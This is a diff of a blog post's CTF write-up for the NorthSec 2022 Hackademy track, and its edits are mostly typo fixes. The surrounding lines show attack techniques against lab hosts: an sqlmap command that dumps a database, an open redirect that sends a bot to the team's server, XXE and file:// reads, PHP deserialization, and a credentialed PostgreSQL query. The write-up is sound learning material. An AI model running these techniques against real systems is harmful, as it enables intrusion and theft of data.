@@ -5,7 +5,7 @@ date: 2022-05-28
 
 This year I participated again in NorthSec CTF. In the weeks prior to the events small challenges were annouced called warmups. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allow people to catch up. 
 
-As for the CTF itself, the scenario was that you were in pentesting a new startup company involved in NFT, metaverse and crypto currencies. Most of the challenges were insanely hard but like previous year there was trivia questions related to hackers movie and the beginner track: Hackademy. It was the same track as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. 
+As for the CTF itself, the scenario was that you were in pentesting a new startup company involved in NFT, metaverse and crypto currencies. Most of the challenges were insanely hard but like last year there was trivia questions related to hackers movie and the beginner track: Hackademy. It was the same track as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. 
 
 Here is the writeup for the Hackademy track.
 
@@ -76,7 +76,7 @@ Last of these challenge use XML external entity injection (XXE). Hopefully I had
 
 ![Inclusion 3 source code](/will-hack-for-coffee/assets/images/nsec2022/inclusion3-source.png)
 
-I sent the POST from the underlying Javascript to my Burp Repeater tab and edited the body paramter so the content of the passwd file is shown in the ext variable on the website.
+I sent the POST from the underlying Javascript AJAX request to my Burp Repeater tab and edited the body parameter so the content of the passwd file is shown through the ext variable on the website.
 ![XXE](/will-hack-for-coffee/assets/images/nsec2022/xxe.png)
 
 ## Upload 101, 102, 103 and 104
@@ -105,7 +105,7 @@ Those two challenges were about SQL injection and the website consisted of a log
 
 ![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sql-injection102.png)
 
-It worked because the query returns one (empty) row. It also gives us a hint for the other challenge. Last year I suggested to a teammate that he could have used [SQLmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. From what I understand it's a blind SQL injection so I tried a couple of command but here the one that worked for me:
+It worked because the query returns one (empty) row. It also gives us a hint for the other challenge. Last year I suggested to a teammate that he could have used [sqlmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. Here is the command that worked for me:
 ````
 └─$ sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
         ___
@@ -175,7 +175,7 @@ Table: fl4G_1s_H3re
 +-----------------------------------------------------------------------------------------------------------------------------+
 ...
 ````
-SQLmap exfiltrated all the database and revealead the flag in the table fl4G_1s_H3re. 
+sqlmap exfiltrated all the database and revealead the flag in the table fl4G_1s_H3re. 
 
 ## Open redirect 101
 
@@ -187,7 +187,11 @@ Navigating the first link and looking at Burp I saw that there was a redirect co
 
 ![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)
 
-You can use [jwt.io](jwt.io) to check what's inside a token and confirm it's a JWT. The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the nsec network so I redirected him there instead:
+You can use [jwt.io](jwt.io) confirm it's a JWT and check what's inside the token. 
+
+![jwt.io](/will-hack-for-coffee/assets/images/nsec2022/jwt-io.png)
+
+The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the NorthSec network so I redirected him there instead:
 
 http://chal5.hackademy.ctf/?sub_url=http://shell.ctf
 
@@ -252,7 +256,7 @@ Looking at the source:
 </html>
 ````
 
-The flag is in the source code but it's replaced by x if it's viewed from the link. It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. PHP use the [serialize](https://www.php.net/manual/en/function.serialize.php) function so it can pass objects as strings in the parameters. It will then automatically launch the __wakeup function that will execute the WelcomeMessage function. What I will do is create a new object that will call the GiveMeFlagPrettyPlease function instead (by setting the property of the object). A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
+The flag is in the source code but it's replaced by x if it's viewed from the link. It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. PHP use the [serialize](https://www.php.net/manual/en/function.serialize.php) function so it can pass objects as strings in the parameters. It will then automatically launch the __wakeup function which will execute the WelcomeMessage function. What I will do is create a new object that will call the GiveMeFlagPrettyPlease function instead (by setting a property of the object). A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
 ````
 <?php
     class Hackademy{
@@ -296,7 +300,7 @@ file:///etc/apache2/sites-enabled/000-default.conf
     </Directory>
 </VirtualHost>
 ````
-So that's where the database is but it can only be accessed locally from the server. I was a bit confused for that part but an enraged hacker gently nudged in the right direction. Let's take a look at the source code:
+So that's where the database is but it can only be accessed locally from the server. I was a bit confused for that part but an enraged hacker gently nudged in the right direction. Let's take a look at the source code of the dabase webpage:
 ````
 <?php 
     if(isset($_POST['user'], $_POST['password'])) {
@@ -339,7 +343,7 @@ Then I used those parameters to get the flag:
 user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
 ````
 
-In last year CTF, the flag was in a flag.txt located at the root folder so I lucked out getting it. This year this was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (maybe disable this on your production server?):
+In last year CTF, the flag was in a flag.txt located at the root folder so we lucked out getting it. This year this was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (maybe disable this on your production server?):
 
 ![Postgresql remote command execution](/will-hack-for-coffee/assets/images/nsec2022/postgresql-rce.png)
 
